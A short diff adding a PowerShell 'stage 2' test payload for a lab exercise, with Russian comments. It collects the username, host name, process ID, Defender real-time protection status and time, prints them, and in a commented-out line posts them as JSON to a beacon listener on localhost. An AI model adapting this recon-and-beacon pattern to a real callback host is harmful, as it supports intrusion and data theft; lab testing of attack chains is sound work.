@@ -1,0 +1,16 @@
+# payload.ps1 — тестовая нагрузка для лабораторной
+Write-Host "[*] Stage 2 executed, PID: $PID"
+
+$info = [PSCustomObject]@{
+    user     = $env:USERNAME
+    host     = $env:COMPUTERNAME
+    pid      = $PID
+    av       = (Get-MpComputerStatus -EA 0).RealTimeProtectionEnabled
+    time     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+}
+
+# вариант A: просто показать
+$info | Format-List
+
+# вариант B: отправить на свой тестовый слушатель (для полноты цепочки)
+# Invoke-RestMethod -Uri http://127.0.0.1:8080/beacon -Method Post -Body ($info | ConvertTo-Json)
